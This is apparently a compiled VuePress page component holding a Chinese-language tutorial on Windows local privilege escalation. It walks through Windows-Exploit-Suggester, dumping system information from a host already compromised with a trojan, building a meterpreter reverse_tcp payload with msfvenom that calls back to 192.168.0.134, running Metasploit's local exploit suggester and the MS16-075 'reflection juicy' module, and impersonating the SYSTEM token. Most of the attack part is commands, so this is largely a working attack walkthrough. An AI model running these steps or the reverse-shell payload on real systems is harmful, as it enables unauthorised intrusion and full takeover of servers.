import{_ as p,p as o,q as l,s,R as a,t,Z as e,n as i}from"./framework-47a2e622.js";const r="/images/image20210522142324.png",c="/images/image20210522142339.png",g="/images/image20210522142444.png",d="/images/image20210522142604.png",u="/images/image20210522143321.png",m={},h=s("h2",{id:"下载",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#下载","aria-hidden":"true"},"#"),a(" 下载")],-1),k={href:"https://github.com/GDSSecurity/Windows-Exploit-Suggester",target:"_blank",rel:"noopener noreferrer"},b=e(`<p>或者使用 kali：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">git</span> clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
</code></pre></div><h2 id="用法" tabindex="-1"><a class="header-anchor" href="#用法" aria-hidden="true">#</a> 用法</h2><p>首先安装库：</p><div class="language-python" data-ext="py"><pre class="language-python"><code>pip install xlrd –upgrade
</code></pre></div><p>更新漏洞补丁库：</p><div class="language-python" data-ext="py"><pre class="language-python"><code><span class="token punctuation">.</span><span class="token operator">/</span>windows<span class="token operator">-</span>exploit<span class="token operator">-</span>suggester<span class="token punctuation">.</span>py –update
</code></pre></div><p>表里面的内容：</p><p><img src="`+r+'" alt=""></p><p><img src="'+c+`" alt=""></p><p>利用木马导出目标主机的系统信息：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>systeminfo <span class="token operator">&gt;</span>C:<span class="token punctuation">\\</span>inetpub<span class="token punctuation">\\</span>wwwroot<span class="token punctuation">\\</span>www.demo1.com<span class="token punctuation">\\</span>systeminfo.txt
</code></pre></div><p>查找可以利用的补丁：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>./windows-exploit-suggester.py –database <span class="token number">2019</span>-05-02-mssb.xls –systeminfo systeminfo.txt <span class="token operator">&gt;</span>exp.txt
</code></pre></div><p><img src="`+g+`" alt=""></p><p>里面有详细的说明可以漏洞利用的 exp，查找指定系统的可以用的漏洞：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>./windows-exploit-suggester.py –database <span class="token number">2019</span>-05-02-mssb.xls –ostext ‘windows server <span class="token number">2008</span> r2’
</code></pre></div><p>显示可利用的本地提权的条目：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>./windows-exploit-suggester.py –audit <span class="token parameter variable">-l</span> –database <span class="token number">2019</span>-05-02-mssb.xls –systeminfo systeminfo.txt <span class="token operator">&gt;</span>win2008-day.txt
</code></pre></div><p><img src="`+d+'" alt=""></p><p>如果补丁没有打上的情况下，就会显示可以利用的 ms 编号 exp 的地址和描述。</p><p>提权 exp <strong>windows-kernel-exploits</strong></p>',22),x={href:"https://github.com/SecWiki/windows-kernel-exploits",target:"_blank",rel:"noopener noreferrer"},w=e(`<p>利用msf攻击，生成攻击载荷：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.134 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">12345</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span>/var/www/html/s.exe
</code></pre></div><p>监听：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>use exploit/multi/handler
<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.0.134
<span class="token builtin class-name">set</span> lport <span class="token number">12345</span>
exploit
</code></pre></div><p>![](/images/image 20210522142900.png)</p><p>得到一个低权限的shell。</p>`,6),_=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"提示"),s("p",null,"background：返回模块选择的命令把 session 放到后台。")],-1),v=e(`<p>使用suggester模块：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>use post/multi/recon/local_exploit_suggester
show options
<span class="token builtin class-name">set</span> seesion <span class="token number">1</span>
exploit
</code></pre></div><p>![](/images/image 20210522143028.png)</p><p>使用模块 windows/local/ms16_075_reflection_juicy 进行攻击：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>use windows/local/ms16_075_reflection_juicy
show options <span class="token comment">#查看参数</span>
<span class="token builtin class-name">set</span> session <span class="token number">1</span>
exploit
</code></pre></div><p>![](/images/image 20210522143232.png)</p><p>得到系统权限。</p><p>使用 MS16-075 提权，选择第一个 session。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>sessions <span class="token number">1</span>
use incognito
list_tokens <span class="token parameter variable">-u</span> //列出tokens
execute <span class="token parameter variable">-cH</span> <span class="token parameter variable">-f</span> C:/inetpub/wwwroot/www.demo1.com/potato.exe //执行exp
list_tokens <span class="token parameter variable">-u</span>
impersonate_token “NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM” //提权
</code></pre></div><p><img src="`+u+'" alt=""></p><p>这个要多试用多次，方可成功。</p>',11);function f(y,S){const n=i("ExternalLinkIcon");return o(),l("div",null,[h,s("p",null,[s("a",k,[a("https://github.com/GDSSecurity/Windows-Exploit-Suggester"),t(n)])]),b,s("p",null,[a("下载： "),s("a",x,[a("https://github.com/SecWiki/windows-kernel-exploits"),t(n)])]),w,_,v])}const W=p(m,[["render",f],["__file","WESuggester.html.vue"]]);export{W as default};